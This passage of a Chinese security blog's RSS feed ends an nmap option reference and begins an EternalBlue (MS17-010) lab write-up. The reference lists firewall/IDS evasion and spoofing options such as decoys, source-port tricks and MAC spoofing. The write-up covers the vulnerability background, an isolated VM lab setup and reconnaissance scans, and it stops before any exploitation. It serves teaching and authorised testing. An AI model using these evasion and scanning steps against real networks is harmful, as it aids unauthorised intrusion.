&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --packet-trace 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--iflist"&gt;&lt;code&gt;--iflist&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：列出接口和路由&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --iflist&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--traceroute"&gt;&lt;code&gt;--traceroute&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：路由跟踪&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --traceroute 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="网络与dns配置"&gt;网络与DNS配置
&lt;/h2&gt;&lt;h3 id="-n"&gt;&lt;code&gt;-n&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：不用域名解析（加快扫描速度，不进行反向DNS查询。）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -n 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-r"&gt;&lt;code&gt;-R&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：为所有目标解析域名。即使目标以IP形式给出，也进行DNS解析。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -R scanme.nmap.org&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--system-dns"&gt;&lt;code&gt;--system-dns&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用系统DNS解析器而不是内置解析器&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --system-dns 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-e"&gt;&lt;code&gt;-e&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：指定网络接口&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;、&lt;code&gt;nmap -e eth0 192.168.1.0/24&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-6"&gt;&lt;code&gt;-6&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：IPv6扫描&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -6 2001:db8::1&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="性能与定时控制"&gt;性能与定时控制
&lt;/h2&gt;&lt;h3 id="-t0-5"&gt;&lt;code&gt;-T&amp;lt;0-5&amp;gt;&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：时序模板，数字越大越快，也越易被发现&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -T4 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--min-rate"&gt;&lt;code&gt;--min-rate&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最小速率。确保扫描速度不低于每秒100个包。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-rate 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--max-rate"&gt;&lt;code&gt;--max-rate&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大速率。限制扫描速度不超过每秒10个包。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-rate 10 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--scan-delay"&gt;&lt;code&gt;--scan-delay&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：探测速率控制。每次探测间隔100ms&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --scan-delay 100ms 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--min-parallelism----max-parallelism"&gt;&lt;code&gt;--min-parallelism&lt;/code&gt; / &lt;code&gt;--max-parallelism&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：并行度&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --min-parallelism 10 --max-parallelism 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--max-retries"&gt;&lt;code&gt;--max-retries&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：最大重试次数&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --max-retries 1 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="防火墙ids规避与欺骗"&gt;防火墙/IDS规避与欺骗
&lt;/h2&gt;&lt;h3 id="-f-1"&gt;&lt;code&gt;-f&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用小数据包分片&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -f 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="-d"&gt;&lt;code&gt;-D&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用诱饵IP进行隐藏&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap -D RND:10 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--source-port"&gt;&lt;code&gt;--source-port&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：使用特定源端口（如53端口可能被防火墙允许）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --source-port 53 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--data-length"&gt;&lt;code&gt;--data-length&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：添加随机数据，在每个包后添加指定长度的随机数据。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --data-length 100 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--ttl"&gt;&lt;code&gt;--ttl&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：设置TTL值&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --ttl 64 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--spoof-mac"&gt;&lt;code&gt;--spoof-mac&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：MAC地址欺骗&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --spoof-mac 00:11:22:33:44:55 192.168.1.100&lt;/code&gt;、&lt;code&gt;nmap --spoof-mac 0 # 随机MAC地址&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h3 id="--badsum"&gt;&lt;code&gt;--badsum&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：发送错误校验和&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --badsum 192.168.1.100&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="权限与运行模式"&gt;权限与运行模式
&lt;/h2&gt;&lt;h3 id="--privileged----unprivileged"&gt;&lt;code&gt;--privileged&lt;/code&gt; / &lt;code&gt;--unprivileged&lt;/code&gt;
&lt;/h3&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;功能&lt;/strong&gt;：当以非root用户运行时模拟原始套接字。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;示例&lt;/strong&gt;：&lt;code&gt;nmap --unprivileged 192.168.1.100 # 非特权模式&lt;/code&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="附件--nmappdf"&gt;附件 &lt;a class="link" href="nmap.pdf" &gt;nmap.pdf&lt;/a&gt;
&lt;/h2&gt;</description></item><item><title>【攻防实践】MS17-010漏洞利用</title><link>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</link><pubDate>Tue, 30 Dec 2025 16:23:12 +0800</pubDate><guid>http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/</guid><description>&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/ms17-010.png" alt="Featured image of post 【攻防实践】MS17-010漏洞利用" /&gt;&lt;h1 id="ms17-010漏洞利用"&gt;MS17-010漏洞利用
&lt;/h1&gt;&lt;div class="custom-toc"&gt;
&lt;h3&gt;目录&lt;/h3&gt;
&lt;nav id="TableOfContents"&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#实践概览"&gt;实践概览&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#ms17-010漏洞"&gt;MS17-010漏洞&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#环境配置"&gt;环境配置&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#实践步骤"&gt;实践步骤&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#隔离网络环境配置与端口扫描"&gt;隔离网络环境配置与端口扫描&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作"&gt;一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#二配置-win7-的静态ip并关闭防火墙"&gt;二、配置 Win7 的静态IP并关闭防火墙&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#三配置kali的静态ip地址并测试二者连通性"&gt;三、配置Kali的静态IP地址并测试二者连通性&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#四nmap扫描结果分析"&gt;四、Nmap扫描结果分析&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#metasploit扫描与漏洞利用"&gt;Metasploit扫描与漏洞利用&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#一启动metasploit框架root"&gt;一、启动Metasploit框架（root）：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#二搜索ms17-010相关模块"&gt;二、搜索ms17-010相关模块：&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#三探测目标主机"&gt;三、探测目标主机&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#四漏洞利用"&gt;四、漏洞利用&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#典型的后渗透攻击行为"&gt;典型的“后渗透”攻击行为&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#一凭据窃取"&gt;一、凭据窃取&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#1-导出哈希值hashdump"&gt;1. 导出哈希值（Hashdump）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#2-抓取内存中的明文密码mimikatz"&gt;2. 抓取内存中的明文密码（Mimikatz）&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#二隐私监控与取证monitoring"&gt;二、隐私监控与取证（Monitoring）&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#1-实时屏幕截图"&gt;1. 实时屏幕截图&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#2-键盘记录keylogging"&gt;2. 键盘记录（Keylogging）&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#3-文件窃取与上传"&gt;3. 文件窃取与上传&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#三metasploit持久化后门攻击"&gt;三、Metasploit持久化后门攻击&lt;/a&gt;
&lt;ul&gt;
&lt;li&gt;&lt;a href="#利用windows服务机制实现权限维持"&gt;利用Windows服务机制实现权限维持&lt;/a&gt;&lt;/li&gt;
&lt;li&gt;&lt;a href="#相关原理"&gt;相关原理&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;a href="#四shell"&gt;四、Shell&lt;/a&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;/nav&gt;
&lt;/div&gt;
&lt;h2 id="实践概览"&gt;实践概览
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;：MS17-010漏洞利用&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;目的&lt;/strong&gt;：&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;时间&lt;/strong&gt;：2025年12月30日&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;风险说明&lt;/strong&gt;：本实验在完全隔离的虚拟化实验室环境下进行，仅用于教育或授权测试&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="ms17-010漏洞"&gt;MS17-010漏洞
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;名称&lt;/strong&gt;：MS17-010&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;别名&lt;/strong&gt;：永恒之蓝（EternalBlue）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;公开时间&lt;/strong&gt;：2017.3.14（补丁发布）；2017.4.14（攻击工具公开）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;相关CVE&lt;/strong&gt;：CVE-2017-0143；CVE-2017-0144；CVE-2017-0145；CVE-2017-0146；CVE-2017-0148 （远程代码执行）；CVE-2017-0147 （信息泄露）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;相关协议&lt;/strong&gt;：服务器消息块 1.0 （SMBv1）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;相关端口&lt;/strong&gt;：TCP &lt;strong&gt;445&lt;/strong&gt;（主要）；&lt;strong&gt;139&lt;/strong&gt;（次要）&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;漏洞原理&lt;/strong&gt;：源于 Windows 内核处理 SMBv1 协议请求的缓冲区溢出。在处理文件扩展属性转换时，系统因错误计算内存大小，导致攻击者可以发送精心构造的数据包，在内核权限下执行任意代码。&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;破坏性&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;无需用户交互&lt;/strong&gt;：攻击者只需向目标主机的445端口发送恶意数据包即可入侵，无需用户点击/打开任何文件&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;危害等级高&lt;/strong&gt;：成功利用后攻击者可在目标系统上执行任意操作，如安装恶意程序、窃取数据、加密文件（勒索软件）或创建后门&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;易于蠕虫化传播&lt;/strong&gt;：&lt;strong&gt;WannaCry&lt;/strong&gt; 勒索病毒采用的方式，导致其在全球范围内像蠕虫一样自动、快速地蔓延&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;影响范围&lt;/strong&gt;：此漏洞影响当时几乎所有未打补丁的 Windows 版本，主要包括：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;桌面系统&lt;/strong&gt;：Windows XP, Vista, 7, 8, 8.1, Windows 10 (早期版本)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;服务器系统&lt;/strong&gt;：Windows Server 2003, 2008, 2008 R2, 2012, 2012 R2, 2016&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;漏洞修复：安装官方安全补丁——Windows Update 或访问微软官方安全公告手动下载并安装编号为&lt;strong&gt;KB4013389&lt;/strong&gt; 的补丁。或手动：&lt;strong&gt;禁用 SMBv1 协议&lt;/strong&gt;、&lt;strong&gt;网络层面封堵&lt;/strong&gt;、&lt;strong&gt;使用入侵防御系统（IPS）&lt;/strong&gt;、&lt;strong&gt;最小化网络暴露&lt;/strong&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="环境配置"&gt;环境配置
&lt;/h2&gt;&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;虚拟环境&lt;/strong&gt;：VMware Workstation 17 Pro - 17.0.0 build-20800274&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;靶机&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Windows 7 Enterprise x64&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.17/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;攻击机&lt;/strong&gt;：
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;系统&lt;/strong&gt;：Linux kali 6.12.25-amd64&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;CPU&lt;/strong&gt;：11th Gen Intel(R) Core(TM) i7-11800H @ 2.30GHz (2.30 GHz)&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;网络&lt;/strong&gt;：LAN（IPv4:10.0.0.223/SubnetMask:255.255.255.0/Gateway:NULL/DNS:NULL）&lt;/li&gt;
&lt;/ul&gt;
&lt;/li&gt;
&lt;/ul&gt;
&lt;h2 id="实践步骤"&gt;实践步骤
&lt;/h2&gt;&lt;h3 id="隔离网络环境配置与端口扫描"&gt;隔离网络环境配置与端口扫描
&lt;/h3&gt;&lt;h4 id="一在-vmware-中创建并分配-lan-区段对-kali-和-win7-执行相同操作"&gt;一、在 VMware 中创建并分配 LAN 区段（对 Kali 和 Win7 执行相同操作）：
&lt;/h4&gt;&lt;p&gt;打开&lt;strong&gt;设置（Setting）&lt;/strong&gt; -&amp;gt; 选择&lt;strong&gt;网络适配器（Network Adapter）&lt;/strong&gt; -&amp;gt; 右侧点击&lt;strong&gt;LAN区段（LAN Segment）&lt;strong&gt;单选框 -&amp;gt; 点击下方“&lt;strong&gt;LAN区段&amp;hellip;&lt;/strong&gt;”按钮 -&amp;gt; 在弹出的窗口中点击&lt;/strong&gt;添加（Add）&lt;/strong&gt; -&amp;gt; 输入名称**“MS17-010_Experiment”** -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt; -&amp;gt; 在&lt;strong&gt;下拉菜单&lt;/strong&gt;中选中刚刚创建的LAN区段 -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1.png"
width="846"
height="630"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_4956252a3246f35d.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/1_hu_14038309d84fe612.png 1024w"
loading="lazy"
alt="1"
class="gallery-image"
data-flex-grow="134"
data-flex-basis="322px"
&gt;&lt;/p&gt;
&lt;h4 id="二配置-win7-的静态ip并关闭防火墙"&gt;二、配置 Win7 的静态IP并关闭防火墙
&lt;/h4&gt;&lt;p&gt;进入Win7 -&amp;gt; 打开&lt;strong&gt;控制面板&lt;/strong&gt; -&amp;gt; &lt;strong&gt;网络和 Internet&lt;/strong&gt; -&amp;gt; &lt;strong&gt;网络和共享中心&lt;/strong&gt; -&amp;gt; &lt;strong&gt;更改适配器设置&lt;/strong&gt; -&amp;gt; 右键点击&lt;strong&gt;本地连接&lt;/strong&gt; -&amp;gt; &lt;strong&gt;属性&lt;/strong&gt; -&amp;gt; 双击&lt;strong&gt;Internet 协议版本4（TCP/IPv4）&lt;/strong&gt; -&amp;gt; 选择使用静态IP地址（IP地址：10.0.0.17 | 子网掩码：255.255.255.0 | 默认网关：空） -&amp;gt; 点击&lt;strong&gt;确定&lt;/strong&gt;退出 -&amp;gt; 在**“网络与共享中心”&lt;strong&gt;点击&lt;/strong&gt;Windows防火墙** -&amp;gt; 选择**“打开或关闭Windows防火墙”** -&amp;gt; 全部关闭（PS：没打补丁不关闭防火墙也能成功）&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2.png"
width="796"
height="557"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_6e6b4b24c64e1825.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/2_hu_8781c3778f402f07.png 1024w"
loading="lazy"
alt="2"
class="gallery-image"
data-flex-grow="142"
data-flex-basis="342px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3.png"
width="797"
height="560"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_4a19f101894a0724.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/3_hu_8d39d4cfdd1dde3d.png 1024w"
loading="lazy"
alt="3"
class="gallery-image"
data-flex-grow="142"
data-flex-basis="341px"
&gt;&lt;/p&gt;
&lt;h4 id="三配置kali的静态ip地址并测试二者连通性"&gt;三、配置Kali的静态IP地址并测试二者连通性
&lt;/h4&gt;&lt;p&gt;打开终端 -&amp;gt; &lt;code&gt;ip addr&lt;/code&gt;指令查看网卡名称（通常为&lt;code&gt;eth0&lt;/code&gt;） -&amp;gt; 手动分配IP地址：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;span class="lnt"&gt;3
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo systemctl stop NetworkMaager &lt;span class="c1"&gt;# 关闭NetworkManager服务——Kali 默认运行NetworkManager服务。当手动使用ip命令修改接口状态时，NetworkManager会检测到接口配置发生了变化。如果该接口被它接管，它会根据自己的配置文件（通常是DHCP或“自动连接”）立即重置接口，从而抹掉刚刚手动添加的IP地址&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip addr add 10.0.0.223/24 dev eth0 &lt;span class="c1"&gt;# 将IP地址10.0.0.223分配给eth0网卡&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;sudo ip link &lt;span class="nb"&gt;set&lt;/span&gt; eth0 up &lt;span class="c1"&gt;# 激活eth0网卡，让它开始工作&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;-&amp;gt; 再次输入&lt;code&gt;ip addr&lt;/code&gt;验证&lt;code&gt;eth0&lt;/code&gt;的IP地址 -&amp;gt; 测试两者连通性并进行Namp扫描：&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;div class="chroma"&gt;
&lt;table class="lntable"&gt;&lt;tr&gt;&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code&gt;&lt;span class="lnt"&gt;1
&lt;/span&gt;&lt;span class="lnt"&gt;2
&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;
&lt;td class="lntd"&gt;
&lt;pre tabindex="0" class="chroma"&gt;&lt;code class="language-bash" data-lang="bash"&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;ping 10.0.0.17 -c &lt;span class="m"&gt;4&lt;/span&gt; &lt;span class="c1"&gt;# 只发送4个数据包&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;span class="line"&gt;&lt;span class="cl"&gt;nmap -n -sV -sC -T4 10.0.0.17 &lt;span class="c1"&gt;# 不进行DNS解析，使用默认的Nmap脚本探测服务/版本信息&lt;/span&gt;
&lt;/span&gt;&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;&lt;/td&gt;&lt;/tr&gt;&lt;/table&gt;
&lt;/div&gt;
&lt;/div&gt;&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4.png"
width="867"
height="670"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_f195f9051ac4a590.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/4_hu_1a4fbf30a2c3580b.png 1024w"
loading="lazy"
alt="4"
class="gallery-image"
data-flex-grow="129"
data-flex-basis="310px"
&gt;&lt;/p&gt;
&lt;p&gt;&lt;img src="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5.png"
width="862"
height="211"
srcset="http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_bd77efe044127f79.png 480w, http://localhost:1313/p/%E6%94%BB%E9%98%B2%E5%AE%9E%E8%B7%B5ms17-010%E6%BC%8F%E6%B4%9E%E5%88%A9%E7%94%A8/5_hu_1c57bebc6d421cb9.png 1024w"
loading="lazy"
alt="5"
class="gallery-image"
data-flex-grow="408"
data-flex-basis="980px"
&gt;&lt;/p&gt;
